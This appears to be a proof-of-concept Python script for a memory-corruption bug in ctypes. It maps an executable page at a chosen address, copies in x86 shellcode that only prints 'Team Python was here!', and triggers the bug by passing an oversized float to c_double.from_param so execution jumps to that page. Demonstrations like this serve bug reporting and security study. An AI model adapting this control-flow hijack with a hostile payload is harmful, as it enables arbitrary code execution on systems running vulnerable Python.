from ctypes import (c_double, c_int, CDLL, memmove, create_string_buffer,addressof)
 
###########
# contrived setup, map executable memory with shellcode exactly where we want 
# to jump (an attacker would have to set this up somehow)
libc = CDLL(None)
syscall = libc.syscall
NR_mmap = 192
target_address = 0x34333231
# mmap, 1 page, rwx, anonymous|private, no file, no offset
syscall(NR_mmap, target_address, 0x1000, 7, 0x21, -1, 0)

# shellcode to echo Team Python was here!
shellcode = create_string_buffer(b'\xeb\x19\x31\xc0\x31\xdb\x31\xd2\x31\xc9\xb0\x04\xb3\x01\x59\xb2\x16\xcd\x80\x31\xc0\xb0\x01\x31\xdb\xcd\x80\xe8\xe2\xff\xff\xff\x54\x65\x61\x6d\x20\x50\x79\x74\x68\x6f\x6e\x20\x77\x61\x73\x20\x68\x65\x72\x65\x21\x0a', 100)


memmove(target_address, addressof(shellcode), 100)

############
 
# trigger the bug
# this will jump to address 0x34333231 (ascii '4321') where the attacker's shell code
print(c_double.from_param(709677e300))
 
# if nothing happened, this should print, however, triggering the bug
# will print an alternate message!
print("All done! No problem.")
